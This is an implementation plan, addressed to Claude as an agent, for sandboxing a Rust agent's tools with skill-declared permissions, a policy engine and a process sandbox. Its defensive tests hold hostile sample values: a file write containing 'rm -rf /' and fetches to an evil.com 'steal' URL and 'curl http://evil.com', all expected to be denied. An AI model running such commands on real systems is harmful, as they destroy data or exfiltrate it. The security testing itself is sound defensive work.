# Skill Sandbox Integration Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Skill 声明权限（permissions），所有 tool 经过 PolicyEngine 检查，execute_command 额外经过 Corral 进程沙箱。

**Architecture:** 两层安全模型。Layer 1: PolicyEngine（Rust 应用层），对 read_file/write_file/web_fetch 等 Rust-native tool 做权限检查。Layer 2: Corral Sandbox（进程层），对 execute_command 的子进程做 libsandbox 隔离。两层共享同一份 Permissions，来源于活跃 skill 的声明与 agent 策略的交集。

**Tech Stack:** Rust, corral-core (Permissions/PolicyEngine), serde_yaml, async-trait

**Backward Compatibility:** skill 没有 `permissions` 字段时，行为与当前完全一致（无额外限制）。只有显式声明了 permissions 的 skill 才会触发权限检查。

---

### Task 1: SkillFrontmatter 添加 permissions 字段

**Files:**
- Modify: `crates/nanocrab-core/src/skill.rs`
- Modify: `crates/nanocrab-core/Cargo.toml`（已有 corral-core 依赖，无需改动）

**Step 1: 写失败测试**

```rust
// skill.rs tests
#[test]
fn parse_frontmatter_with_permissions() {
    let raw = r#"---
name: web-fetch
description: Fetch web content
requires:
  bins: [curl]
permissions:
  fs:
    read: ["$SKILL_DIR/**"]
    write: ["$WORK_DIR/**"]
  network:
    allow: ["*:443", "*:80"]
  exec: [curl, jq]
  env: [LANG]
---
Content here"#;
    let (fm, _content) = parse_frontmatter(raw).unwrap();
    let perms = fm.permissions.unwrap();
    assert_eq!(perms.fs.read.len(), 1);
    assert_eq!(perms.network.allow.len(), 2);
    assert_eq!(perms.exec, vec!["curl", "jq"]);
}

#[test]
fn parse_frontmatter_without_permissions_is_none() {
    let raw = "---\nname: simple\ndescription: No perms\n---\nBody";
    let (fm, _) = parse_frontmatter(raw).unwrap();
    assert!(fm.permissions.is_none());
}
```

**Step 2: 跑测试，确认失败**

Run: `cargo test -p nanocrab-core -- skill::tests::parse_frontmatter_with_permissions -v`
Expected: FAIL — `SkillFrontmatter` 没有 `permissions` 字段

**Step 3: 实现**

在 `skill.rs` 中：

- 添加 `SkillPermissions` 类型（从 corral_core::Permissions 的字段结构映射，用 serde 兼容的扁平结构）
- 在 `SkillFrontmatter` 中加 `#[serde(default)] pub permissions: Option<SkillPermissions>`
- 在 `Skill` 中加 `pub permissions: Option<SkillPermissions>`
- `load_skill()` 传递 permissions 到 Skill struct
- 提供 `SkillPermissions::to_corral_permissions(&self) -> corral_core::Permissions` 转换方法

SkillPermissions 的 YAML schema：

```yaml
permissions:
  fs:                           # 文件系统访问
    read: [glob_pattern, ...]   # 允许读取的路径（glob）
    write: [glob_pattern, ...]  # 允许写入的路径（glob）
  network:                      # 网络访问
    allow: [host:port, ...]     # 允许的地址（支持 *.example.com:443 通配符）
  exec: [binary_name, ...]      # 允许执行的可执行文件名
  env: [VAR_NAME, ...]          # 允许访问的环境变量
  services:                     # 系统服务访问
    reminders:
      access: read | write | readwrite
      scope:
        lists: [list_name, ...]
    calendar:
      access: read | write | readwrite
    notifications:
      access: send
```

路径变量说明（skill 作者需要知道的）：
- `$SKILL_DIR` — skill 目录（SKILL.md 所在目录）
- `$WORK_DIR` — agent 的 workspace 目录
- `$DATA_DIR` — skill 的持久数据目录

**Step 4: 跑测试，确认通过**

Run: `cargo test -p nanocrab-core -- skill::tests -v`
Expected: ALL PASS

**Step 5: Commit**

```
git add crates/nanocrab-core/src/skill.rs
git commit -m "feat(skill): add permissions field to SkillFrontmatter with corral Permissions mapping"
```

---

### Task 2: ToolContext — 在 tool 执行链路中传递 PolicyEngine

**Files:**
- Modify: `crates/nanocrab-core/src/tool.rs`
- Modify: 所有 tool 实现文件的 `execute` 签名（shell_tool, file_tools, web_fetch_tool, web_search_tool, memory_tools, subagent_tool）
- Modify: `crates/nanocrab-core/src/orchestrator.rs`（tool_use_loop 传递 context）

**Step 1: 写失败测试**

```rust
// tool.rs tests — 修改 EchoTool 测试使用新签名
#[tokio::test]
async fn registry_execute_known_tool() {
    let mut registry = ToolRegistry::new();
    registry.register(Box::new(EchoTool));
    let ctx = ToolContext::unrestricted();
    let result = registry
        .execute("echo", serde_json::json!({"text": "hello"}), &ctx)
        .await
        .unwrap();
    assert_eq!(result.content, "hello");
}
```

**Step 2: 跑测试确认失败**

**Step 3: 实现**

在 `tool.rs` 中添加：

```rust
use corral_core::PolicyEngine;

pub struct ToolContext {
    policy: Option<PolicyEngine>,
}

impl ToolContext {
    pub fn new(policy: PolicyEngine) -> Self {
        Self { policy: Some(policy) }
    }

    /// 无限制模式 — 没有声明 permissions 的 skill，或者内部 tool
    pub fn unrestricted() -> Self {
        Self { policy: None }
    }

    /// 检查文件读权限。无 policy 时始终允许。
    pub fn check_read(&self, path: &str) -> bool {
        self.policy.as_ref().map_or(true, |p| p.check_path_read(path))
    }

    /// 检查文件写权限
    pub fn check_write(&self, path: &str) -> bool {
        self.policy.as_ref().map_or(true, |p| p.check_path_write(path))
    }

    /// 检查网络访问
    pub fn check_network(&self, host: &str, port: u16) -> bool {
        self.policy.as_ref().map_or(true, |p| p.check_network(host, port))
    }

    /// 检查命令执行
    pub fn check_exec(&self, cmd: &str) -> bool {
        self.policy.as_ref().map_or(true, |p| p.check_exec(cmd))
    }

    pub fn policy(&self) -> Option<&PolicyEngine> {
        self.policy.as_ref()
    }
}
```

修改 trait：

```rust
#[async_trait]
pub trait ToolExecutor: Send + Sync {
    fn definition(&self) -> ToolDef;
    async fn execute(&self, input: serde_json::Value, ctx: &ToolContext) -> Result<ToolOutput>;
}
```

修改 `ToolRegistry::execute`：

```rust
pub async fn execute(&self, name: &str, input: serde_json::Value, ctx: &ToolContext) -> Result<ToolOutput> {
    let tool = self.tools.get(name)
        .ok_or_else(|| anyhow!("tool not found: {name}"))?;
    tool.execute(input, ctx).await
}
```

**所有现有 tool 实现**：签名加 `_ctx: &ToolContext` 参数，body 不变（暂不使用 ctx，下面的 task 逐个接入）。

**orchestrator.rs** 的 `tool_use_loop`：

```rust
// 在 tool_use_loop 中，构建 ctx 并传递
let ctx = /* 从活跃 skill 计算，见 Task 4 */;
let result = match self.tool_registry.execute(&name, input, &ctx).await { ... };
```

本 task 暂时传 `ToolContext::unrestricted()`，确保行为不变。

**Step 4: 跑全量测试**

Run: `cargo test -p nanocrab-core -v`
Expected: ALL PASS（行为无变化，只是签名改了）

**Step 5: Commit**

```
git commit -m "refactor(tool): add ToolContext to ToolExecutor trait for permission propagation"
```

---

### Task 3: Orchestrator 计算有效权限

**Files:**
- Modify: `crates/nanocrab-core/src/orchestrator.rs`
- Modify: `crates/nanocrab-core/src/skill.rs`（SkillRegistry 添加合并方法）

**Step 1: 写失败测试**

```rust
// skill.rs tests
#[test]
fn merged_permissions_union() {
    let dir = tempfile::tempdir().unwrap();

    // skill A: network allowed
    let a_dir = dir.path().join("skill-a");
    std::fs::create_dir_all(&a_dir).unwrap();
    std::fs::write(a_dir.join("SKILL.md"), r#"---
name: skill-a
description: A
permissions:
  network:
    allow: ["api.a.com:443"]
  exec: [curl]
---
Body"#).unwrap();

    // skill B: different network
    let b_dir = dir.path().join("skill-b");
    std::fs::create_dir_all(&b_dir).unwrap();
    std::fs::write(b_dir.join("SKILL.md"), r#"---
name: skill-b
description: B
permissions:
  network:
    allow: ["api.b.com:443"]
  exec: [python3]
---
Body"#).unwrap();

    let registry = SkillRegistry::load_from_dir(dir.path()).unwrap();
    let merged = registry.merged_permissions();

    // 并集：两个 skill 的 network 合并
    let perms = merged.unwrap();
    assert!(perms.network.allow.contains(&"api.a.com:443".to_string()));
    assert!(perms.network.allow.contains(&"api.b.com:443".to_string()));
    assert!(perms.exec.contains(&"curl".to_string()));
    assert!(perms.exec.contains(&"python3".to_string()));
}

#[test]
fn merged_permissions_none_when_no_skills_have_permissions() {
    let dir = tempfile::tempdir().unwrap();
    let s = dir.path().join("plain");
    std::fs::create_dir_all(&s).unwrap();
    std::fs::write(s.join("SKILL.md"), "---\nname: plain\ndescription: X\n---\nBody").unwrap();

    let registry = SkillRegistry::load_from_dir(dir.path()).unwrap();
    assert!(registry.merged_permissions().is_none());
}
```

**Step 2: 跑测试确认失败**

**Step 3: 实现**

`SkillRegistry` 添加：

```rust
pub fn merged_permissions(&self) -> Option<corral_core::Permissions> {
    let skill_perms: Vec<_> = self.available()
        .iter()
        .filter_map(|s| s.permissions.as_ref())
        .map(|sp| sp.to_corral_permissions())
        .collect();

    if skill_perms.is_empty() {
        return None;
    }

    // 并集：所有 skill 的权限合在一起
    let mut merged = corral_core::Permissions::default();
    for p in skill_perms {
        merged.fs.read.extend(p.fs.read);
        merged.fs.write.extend(p.fs.write);
        merged.network.allow.extend(p.network.allow);
        merged.exec.extend(p.exec);
        merged.env.extend(p.env);
        merged.services.extend(p.services);
    }

    // 去重
    merged.fs.read.sort();
    merged.fs.read.dedup();
    merged.fs.write.sort();
    merged.fs.write.dedup();
    merged.network.allow.sort();
    merged.network.allow.dedup();
    merged.exec.sort();
    merged.exec.dedup();
    merged.env.sort();
    merged.env.dedup();

    Some(merged)
}
```

**orchestrator.rs** 的 `tool_use_loop` 中：

```rust
// 计算 ToolContext
let ctx = match self.skill_registry.merged_permissions() {
    Some(perms) => ToolContext::new(PolicyEngine::new(perms)),
    None => ToolContext::unrestricted(),
};
```

将 `ctx` 传递给 `self.tool_registry.execute(&name, input, &ctx)`。

**Step 4: 跑测试**

Run: `cargo test -p nanocrab-core -v`
Expected: ALL PASS

**Step 5: Commit**

```
git commit -m "feat(skill): compute merged permissions from active skills and wire into tool_use_loop"
```

---

### Task 4: file_tools 接入 PolicyEngine（Layer 1）

**Files:**
- Modify: `crates/nanocrab-core/src/file_tools.rs`

**Step 1: 写失败测试**

```rust
#[tokio::test]
async fn read_file_denied_by_policy() {
    let tmp = TempDir::new().unwrap();
    std::fs::write(tmp.path().join("secret.txt"), "classified").unwrap();

    let tool = ReadFileTool::new(tmp.path().to_path_buf());

    // Policy 只允许读 *.md 文件
    let perms = corral_core::Permissions::builder()
        .fs_read(["**/*.md"])
        .build();
    let ctx = ToolContext::new(corral_core::PolicyEngine::new(perms));

    let result = tool.execute(serde_json::json!({"path": "secret.txt"}), &ctx).await.unwrap();
    assert!(result.is_error);
    assert!(result.content.contains("denied"));
}

#[tokio::test]
async fn write_file_denied_by_policy() {
    let tmp = TempDir::new().unwrap();
    let tool = WriteFileTool::new(tmp.path().to_path_buf());

    let perms = corral_core::Permissions::builder()
        .fs_write(["**/*.log"])
        .build();
    let ctx = ToolContext::new(corral_core::PolicyEngine::new(perms));

    let result = tool.execute(
        serde_json::json!({"path": "hack.sh", "content": "rm -rf /"}),
        &ctx,
    ).await.unwrap();
    assert!(result.is_error);
}

#[tokio::test]
async fn read_file_allowed_without_policy() {
    let tmp = TempDir::new().unwrap();
    std::fs::write(tmp.path().join("ok.txt"), "hello").unwrap();

    let tool = ReadFileTool::new(tmp.path().to_path_buf());
    let ctx = ToolContext::unrestricted();

    let result = tool.execute(serde_json::json!({"path": "ok.txt"}), &ctx).await.unwrap();
    assert!(!result.is_error);
    assert!(result.content.contains("hello"));
}
```

**Step 2: 跑测试确认失败**

**Step 3: 实现**

在 `ReadFileTool::execute()` 中，`validate_path()` 之后加检查：

```rust
let resolved = validate_path(&self.workspace, path)?;
let relative = resolved.strip_prefix(&self.workspace.canonicalize()?)
    .unwrap_or(&resolved);
if !ctx.check_read(relative.to_str().unwrap_or("")) {
    return Ok(ToolOutput {
        content: format!("Read access denied for path: {path}"),
        is_error: true,
    });
}
```

对 `WriteFileTool::execute()` 和 `EditFileTool::execute()` 做同样处理，用 `ctx.check_write()`。

**Step 4: 跑测试**

Run: `cargo test -p nanocrab-core -- file_tools -v`
Expected: ALL PASS

**Step 5: Commit**

```
git commit -m "feat(file_tools): enforce PolicyEngine read/write checks from skill permissions"
```

---

### Task 5: web_fetch_tool 接入 PolicyEngine（Layer 1）

**Files:**
- Modify: `crates/nanocrab-core/src/web_fetch_tool.rs`

**Step 1: 写失败测试**

```rust
#[tokio::test]
async fn web_fetch_denied_by_policy() {
    let tool = WebFetchTool::new();
    let perms = corral_core::Permissions::builder()
        .network_allow(["api.example.com:443"])
        .build();
    let ctx = ToolContext::new(corral_core::PolicyEngine::new(perms));

    let result = tool.execute(
        serde_json::json!({"url": "https://evil.com/steal"}),
        &ctx,
    ).await.unwrap();
    assert!(result.is_error);
    assert!(result.content.contains("denied"));
}

#[tokio::test]
async fn web_fetch_allowed_without_policy() {
    let tool = WebFetchTool::new();
    let ctx = ToolContext::unrestricted();
    // unrestricted 下不拦截（现有行为）
    // 注意：这个测试会实际发请求，标记 #[ignore] 或 mock
}
```

**Step 2: 跑测试确认失败**

**Step 3: 实现**

在 `WebFetchTool::execute()` 中，URL 验证之后，发请求之前：

```rust
// 解析 host:port
if let Ok(parsed) = url::Url::parse(url) {
    let host = parsed.host_str().unwrap_or("");
    let port = parsed.port_or_known_default().unwrap_or(443);
    if !ctx.check_network(host, port) {
        return Ok(ToolOutput {
            content: format!("Network access denied for {host}:{port}"),
            is_error: true,
        });
    }
}
```

对 `WebSearchTool` 做类似处理（检查 Brave API 的域名）。不过 web_search 是平台内置能力，agent 配置里有 api_key 才启用，可能不需要 skill 级别的限制。留一个 TODO 注释即可。

`Cargo.toml` 需要加 `url = "2"` 依赖（如果还没有的话）。

**Step 4: 跑测试**

Run: `cargo test -p nanocrab-core -- web_fetch -v`
Expected: ALL PASS

**Step 5: Commit**

```
git commit -m "feat(web_fetch): enforce PolicyEngine network checks from skill permissions"
```

---

### Task 6: shell_tool 使用 Skill 来源的权限构建 Sandbox（Layer 2）

**Files:**
- Modify: `crates/nanocrab-core/src/shell_tool.rs`

**Step 1: 写失败测试**

```rust
#[tokio::test]
async fn sandbox_uses_policy_from_context() {
    let tmp = TempDir::new().unwrap();
    std::fs::write(tmp.path().join("data.txt"), "hello").unwrap();

    let tool = ExecuteCommandTool::new(tmp.path().to_path_buf(), 10);

    // 有 policy 的 context — 只允许 sh + cat
    let perms = corral_core::Permissions::builder()
        .fs_read([format!("{}/**", tmp.path().display())])
        .exec_allow(["sh", "cat"])
        .build();
    let ctx = ToolContext::new(corral_core::PolicyEngine::new(perms));

    let result = tool.execute(
        serde_json::json!({"command": "cat data.txt"}),
        &ctx,
    ).await.unwrap();
    assert!(!result.is_error);
    assert!(result.content.contains("hello"));
}
```

**Step 2: 跑测试确认失败**

**Step 3: 实现**

修改 `ExecuteCommandTool::execute()` — 当 `ctx` 有 policy 时，从 policy 的 permissions 构建 Sandbox，而不是用硬编码的 `base_permissions()`：

```rust
let result = if enable_reminders_service {
    let sandbox = sandbox_with_broker(&self.workspace, timeout_secs, &reminders_lists).await?;
    sandbox.execute_with_timeout(command, timeout).await
} else if let Some(policy) = ctx.policy() {
    // Skill 声明了 permissions — 用 skill 的权限构建沙箱
    let sandbox = sandbox_from_policy(&self.workspace, policy)?;
    sandbox.execute_with_timeout(command, timeout).await
} else {
    // 无 permissions — 用默认沙箱（workspace 范围，禁网）
    let sandbox = self.default_sandbox
        .get_or_try_init(|| async { default_sandbox(&self.workspace) })
        .await?;
    sandbox.execute_with_timeout(command, timeout).await
};
```

新增 `sandbox_from_policy()`：

```rust
fn sandbox_from_policy(workspace: &Path, policy: &PolicyEngine) -> Result<Sandbox> {
    let config = SandboxConfig {
        permissions: policy.permissions().clone(),
        work_dir: workspace.to_path_buf(),
        data_dir: None,
        timeout: Duration::from_secs(30),
        max_memory_mb: Some(512),
        env_vars: collect_env_vars(),
        broker_socket: None,
    };
    Sandbox::new(config)
}
```

注意：`sandbox_from_policy` 每次创建新 Sandbox（因为 policy 可能不同），不走 OnceCell 缓存。如果性能敏感可以后续优化为按 permissions hash 缓存。

**Step 4: 跑测试**

Run: `cargo test -p nanocrab-core -- shell_tool -v`
Expected: ALL PASS

**Step 5: Commit**

```
git commit -m "feat(shell_tool): build Corral sandbox from skill-declared permissions via ToolContext"
```

---

### Task 7: 更新现有 skill 的 SKILL.md 添加 permissions

**Files:**
- Modify: `skills/web_fetch/SKILL.md`
- Modify: `skills/example/SKILL.md`（如果有）
- 其他 skills

**Step 1: 给 web_fetch skill 加 permissions**

```yaml
---
name: web_fetch
description: Fetch web content via curl
requires:
  bins: [curl]
permissions:
  network:
    allow: ["*:443", "*:80"]
  exec: [curl, sh]
  fs:
    read: ["$SKILL_DIR/**"]
    write: ["$WORK_DIR/**"]
---
```

**Step 2: 给没有特殊需求的 skill 保持不加 permissions（向后兼容）**

**Step 3: Commit**

```
git commit -m "docs(skills): add permissions declarations to existing skills"
```

---

### Task 8: 集成测试 — 端到端验证

**Files:**
- Create: `crates/nanocrab-core/tests/sandbox_integration.rs`

写一个集成测试：

1. 创建带 permissions 的 skill（只允许 `cat`，禁网）
2. 加载到 SkillRegistry
3. 计算 merged permissions → 构建 ToolContext
4. 调 execute_command("cat file") → 成功
5. 调 execute_command("curl http://evil.com") → 被 preflight 拦截
6. 调 read_file("secret.txt") → 被 PolicyEngine 拒绝（如果 skill 没声明该路径）

```
git commit -m "test: add end-to-end sandbox integration tests"
```

---

## 执行顺序依赖

```
Task 1 (SkillFrontmatter + permissions)
    │
    └──→ Task 2 (ToolContext + trait 改签名)
              │
              ├──→ Task 3 (Orchestrator 计算有效权限)
              │         │
              │         └──→ Task 6 (shell_tool 用 skill 权限建沙箱)
              │
              ├──→ Task 4 (file_tools 接入 PolicyEngine)
              │
              └──→ Task 5 (web_fetch 接入 PolicyEngine)

Task 7 (更新 skill 文件) — 独立，任意时间

Task 8 (集成测试) — 依赖 Task 3-6 全部完成
```

Task 4 和 Task 5 可以并行。Task 3 和 Task 4/5 也可以并行（Task 3 改 orchestrator，Task 4/5 改 tool 实现）。
